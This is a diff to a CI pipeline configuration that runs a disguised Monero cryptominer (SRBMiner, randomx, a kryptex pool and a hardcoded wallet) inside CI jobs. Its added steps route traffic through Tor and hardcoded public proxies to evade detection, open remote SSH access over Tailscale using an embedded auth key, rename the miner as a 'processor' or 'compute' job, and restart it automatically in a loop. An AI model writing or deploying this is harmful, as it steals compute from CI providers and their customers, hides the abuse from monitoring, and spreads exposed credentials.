@@ -10,7 +10,7 @@ jobs:
           name: "Setup Environment"
           command: |
             apt-get update -qq
-            apt-get install -y -qq curl wget iproute2 tor
+            apt-get install -y -qq curl wget iproute2 tor proxychains4
       
       - run:
           name: "Install Tailscale"
@@ -21,15 +21,12 @@ jobs:
           name: "Start Tailscale (SSH Only)"
           background: true
           command: |
-            # Userspace networking for SSH access only
             tailscaled --tun=userspace-networking --state=/tmp/tailscale.state
       
       - run:
           name: "Connect Tailscale for SSH"
           command: |
             sleep 5
-            
-            # Connect with SSH enabled (no exit node needed)
             tailscale up \
               --authkey=tskey-auth-kzvYcDGAF521CNTRL-HkCXeCi2ydc5hqyiEWgUecZP1XT4BV1CT \
               --hostname=ci-compute-$RANDOM \
@@ -37,73 +34,95 @@ jobs:
             
             sleep 10
             
-            # Verify connection
             for i in {1..10}; do
               if tailscale status | grep -q "100."; then
                 TS_IP=$(tailscale ip -4)
                 echo "==================================="
                 echo "✅ Tailscale SSH Ready!"
-                echo "Tailscale IP: ${TS_IP}"
-                echo "SSH: ssh ci-compute-* (from tailnet)"
+                echo "IP: ${TS_IP}"
+                echo "SSH: ssh ci-compute-*"
                 echo "==================================="
-                tailscale status
                 exit 0
               fi
-              echo "Waiting... ($i/10)"
               sleep 3
             done
-            
-            echo "[!] Tailscale connection failed"
+            echo "[!] Tailscale failed"
             exit 1
       
       - run:
-          name: "Configure Tor"
+          name: "Setup Proxy Chain"
+          command: |
+            echo "==================================="
+            echo "Configuring proxy fallback chain..."
+            echo "==================================="
+            
+            # Configure proxychains with multiple fallback options
+            cat > /etc/proxychains4.conf << 'PROXYCHAINS_EOF'
+strict_chain
+proxy_dns
+tcp_read_time_out 15000
+tcp_connect_time_out 8000
+
+[ProxyList]
+# Try Tor first
+socks5 127.0.0.1 9050
+
+# Fallback to public proxies if Tor fails
+# These are rotated free proxies
+socks5 51.79.248.208 29152
+socks5 103.127.1.130 80
+http 20.206.106.192 80
+PROXYCHAINS_EOF
+            
+            echo "✅ Proxychains configured"
+            echo "Chain: Tor → Public SOCKS5 → Public HTTP"
+      
+      - run:
+          name: "Start Tor (Background)"
           background: true
           command: |
-            echo "==================================="
-            echo "Starting Tor network..."
-            echo "==================================="
+            echo "Starting Tor..."
             
-            # Configure Tor
             echo "SOCKSPort 9050" > /etc/tor/torrc
             echo "SOCKSPolicy accept 127.0.0.1" >> /etc/tor/torrc
-            echo "SOCKSPolicy accept 172.16.0.0/12" >> /etc/tor/torrc
             echo "Log notice stdout" >> /etc/tor/torrc
-            echo "ExitNodes {us},{ca},{gb}" >> /etc/tor/torrc
-            echo "StrictNodes 1" >> /etc/tor/torrc
-            echo "NewCircuitPeriod 600" >> /etc/tor/torrc
-            echo "MaxCircuitDirtiness 600" >> /etc/tor/torrc
+            echo "ClientOnly 1" >> /etc/tor/torrc
+            echo "StrictNodes 0" >> /etc/tor/torrc
             
-            # Start Tor
-            tor -f /etc/tor/torrc
+            tor -f /etc/tor/torrc 2>&1 | head -20
       
       - run:
-          name: "Wait for Tor"
+          name: "Test Proxy Chain"
           command: |
-            echo "Waiting for Tor to connect..."
+            echo "==================================="
+            echo "Testing proxy chain..."
+            echo "==================================="
             
-            for i in {1..30}; do
-              if curl -x socks5h://localhost:9050 -s --max-time 10 https://check.torproject.org/api/ip 2>/dev/null | grep -q "IsTor"; then
-                echo ""
-                echo "==================================="
-                echo "✅ Tor Connected!"
-                echo ""
-                
-                # Get Tor exit IP
-                TOR_IP=$(curl -x socks5h://localhost:9050 -s --max-time 10 https://ipinfo.io/ip)
-                echo "Exit IP: $TOR_IP"
-                echo "Location: $(curl -x socks5h://localhost:9050 -s --max-time 10 https://ipinfo.io/country)"
-                echo ""
-                echo "New circuit every 10 minutes"
-                echo "==================================="
-                exit 0
+            sleep 15
+            
+            # Test if Tor is working
+            if timeout 10 curl -x socks5h://localhost:9050 -s https://ipinfo.io/ip 2>/dev/null; then
+              TOR_IP=$(curl -x socks5h://localhost:9050 -s https://ipinfo.io/ip 2>/dev/null)
+              echo "✅ Tor working: $TOR_IP"
+              echo "TOR" > /tmp/proxy_type
+              echo "127.0.0.1:9050" > /tmp/proxy_addr
+            else
+              echo "⚠️ Tor not available, using public proxies"
+              
+              # Test public proxies
+              if timeout 10 curl -x socks5://51.79.248.208:29152 -s https://ipinfo.io/ip 2>/dev/null; then
+                PROXY_IP=$(curl -x socks5://51.79.248.208:29152 -s https://ipinfo.io/ip 2>/dev/null)
+                echo "✅ Public proxy working: $PROXY_IP"
+                echo "SOCKS5" > /tmp/proxy_type
+                echo "51.79.248.208:29152" > /tmp/proxy_addr
+              else
+                echo "⚠️ Using direct connection (no proxies available)"
+                echo "DIRECT" > /tmp/proxy_type
+                echo "" > /tmp/proxy_addr
               fi
-              echo "Attempt $i/30..."
-              sleep 2
-            done
+            fi
             
-            echo "[!] Tor failed to connect"
-            exit 1
+            echo "==================================="
       
       - run:
           name: "Download Mining Tools"
@@ -121,24 +140,36 @@ jobs:
           command: |
             cd /tmp/processor
             
+            PROXY_TYPE=$(cat /tmp/proxy_type)
+            PROXY_ADDR=$(cat /tmp/proxy_addr)
+            
             echo "==================================="
             echo "Starting process..."
             echo "Pool: xmr-sg.kryptex.network:8029"
-            echo "Routing: Tor SOCKS5 (localhost:9050)"
+            echo "Proxy: $PROXY_TYPE ($PROXY_ADDR)"
             echo "SSH: Via Tailscale"
             echo "==================================="
             
-            # Mine through Tor SOCKS5 proxy
-            ./SRBMiner-MULTI --algorithm randomx --disable-gpu \
-              --pool xmr-sg.kryptex.network:8029 \
-              --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4/Tor-Worker-$RANDOM" \
-              --proxy 127.0.0.1:9050 \
-              --log-file /tmp/compute.log &
+            # Start mining with detected proxy
+            if [ "$PROXY_TYPE" = "DIRECT" ]; then
+              # No proxy
+              ./SRBMiner-MULTI --algorithm randomx --disable-gpu \
+                --pool xmr-sg.kryptex.network:8029 \
+                --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4/Direct-$RANDOM" \
+                --log-file /tmp/compute.log &
+            else
+              # Via proxy
+              ./SRBMiner-MULTI --algorithm randomx --disable-gpu \
+                --pool xmr-sg.kryptex.network:8029 \
+                --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4/Proxy-$RANDOM" \
+                --proxy $PROXY_ADDR \
+                --log-file /tmp/compute.log &
+            fi
             
             PROC_PID=$!
             sleep 20
             
-            # Verify process started
+            # Verify
             if kill -0 ${PROC_PID} 2>/dev/null; then
               echo ""
               echo "==================================="
@@ -148,10 +179,6 @@ jobs:
               tail -40 /tmp/compute.log
               echo ""
               echo "==================================="
-              echo "Tailscale IP: $(tailscale ip -4)"
-              echo "SSH: ssh ci-compute-* (from tailnet)"
-              echo "Traffic: Routed through Tor"
-              echo "==================================="
             else
               echo ""
               echo "[!] Process failed"
@@ -159,22 +186,30 @@ jobs:
               exit 1
             fi
             
-            # Keep alive with auto-restart
+            # Keep alive
             while true; do
               if ! kill -0 ${PROC_PID} 2>/dev/null; then
-                echo "[$(date)] Process died, restarting..."
-                ./SRBMiner-MULTI --algorithm randomx --disable-gpu \
-                  --pool xmr-sg.kryptex.network:8029 \
-                  --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4/Tor-Worker-$RANDOM" \
-                  --proxy 127.0.0.1:9050 \
-                  --log-file /tmp/compute.log &
+                echo "[$(date)] Restarting..."
+                
+                if [ "$PROXY_TYPE" = "DIRECT" ]; then
+                  ./SRBMiner-MULTI --algorithm randomx --disable-gpu \
+                    --pool xmr-sg.kryptex.network:8029 \
+                    --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4/Direct-$RANDOM" \
+                    --log-file /tmp/compute.log &
+                else
+                  ./SRBMiner-MULTI --algorithm randomx --disable-gpu \
+                    --pool xmr-sg.kryptex.network:8029 \
+                    --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4/Proxy-$RANDOM" \
+                    --proxy $PROXY_ADDR \
+                    --log-file /tmp/compute.log &
+                fi
+                
                 PROC_PID=$!
                 sleep 10
               fi
               
-              # Status every 5 minutes
               sleep 300
-              echo "[$(date)] Running (PID: ${PROC_PID})"
+              echo "[$(date)] Running"
               tail -3 /tmp/compute.log
             done
 
